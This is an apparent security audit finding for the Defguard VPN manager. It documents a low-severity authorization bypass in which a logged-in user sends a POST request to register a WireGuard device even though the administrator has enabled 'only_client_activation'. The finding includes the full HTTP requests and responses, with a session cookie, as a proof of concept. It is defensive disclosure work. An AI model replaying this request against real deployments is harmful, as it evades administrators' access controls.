---
title: "DG25-12: User can bypass only_client_activation feature"
cvss_score: 4.3
severity: Low
cvss_string: "/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"
issue_link: https://github.com/DefGuard/defguard/issues/1525
status: Completed
---

### Technical details

1.  only_client_activation is set to true - meaning that administrator
    disabled manual WireGuard configuration

**Request:**\
\
**GET** /api/v1/settings_enterprise HTTP/2\
**Host:** defguard.dvpnsec.net\
**Cookie:** defguard_session=NsgBmPHhmwakT9UGb0QO4SoR\
\
\
**Response:**\
\
**HTTP/2** 200 OK\
**Alt-Svc:** h3=\":443\"; ma=2592000\
**Content-Type:** application/json\
**Date:** Wed, 06 Aug 2025 12:17:11 GMT\
**Server:** Caddy\
**X-Defguard-Version:** 1.5.0-a29ac10\
**Content-Length:** 91\
\
{\"admin_device_management\":false,\"disable_all_traffic\":false,\"only_client_activation\":true}

1.  User can still send HTTP request which manually creates new device:

**Request:**\
\
**POST** /api/v1/device/userAAA HTTP/2\
**Host:** defguard.dvpnsec.net\
**Cookie:** defguard_session=NsgBmPHhmwakT9UGb0QO4SoR\
**Content-Length:** 95\
**Sec-Ch-Ua:** \"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\"\
**Content-Type:** application/json\
**Sec-Ch-Ua-Mobile:** ?0\
**User-Agent:** Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36\
**Accept-Encoding:** gzip, deflate, br\
**Priority:** u=1, i\
\
{\"name\":\"new-device-123-abc\",\"wireguard_pubkey\":\"fb4r8zxzstQ+/GxULwnqW9mqDF3YrBT2SvcEHyXqoWM=\"}\
\
\
**Response:**\
\
**HTTP/2** 201 Created\
**Alt-Svc:** h3=\":443\"; ma=2592000\
**Content-Type:** application/json\
**Date:** Wed, 06 Aug 2025 12:28:29 GMT\
**Server:** Caddy\
**X-Defguard-Version:** 1.5.0-a29ac10\
**Content-Length:** 736\
\

```json
{
  "configs": [
    {
      "address": [
        "10.22.33.10"
      ],
      "allowed_ips": [
        "10.22.33.0/24"
      ],
      "config": "[Interface]\nPrivateKey = YOUR_PRIVATE_KEY\nAddress = 10.22.33.10\n\n[Peer]\nPublicKey = wq5uFq9EnnRQkIDJr3I/bYS/EhBvwc4nptIewnhzdhU=\nAllowedIPs = 10.22.33.0/24\nEndpoint = 167.172.191.17:51820\nPersistentKeepalive = 300",
      "dns": null,
      "endpoint": "167.172.191.17:51820",
      "keepalive_interval": 25,
      "location_mfa_mode": "disabled",
      "network_id": 1,
      "network_name": "Demo-Location",
      "pubkey": "wq5uFq9EnnRQkIDJr3I/bYS/EhBvwc4nptIewnhzdhU="
    }
  ],
  "device": {
    "configured": true,
    "created": "2025-08-06T12:28:29.747718276",
    "description": null,
    "device_type": "User",
    "id": 20,
    "name": "new-device-123-abc",
    "user_id": 49,
    "wireguard_pubkey": "fb4r8zxzstQ+/GxULwnqW9mqDF3YrBT2SvcEHyXqoWM="
  }
}
```
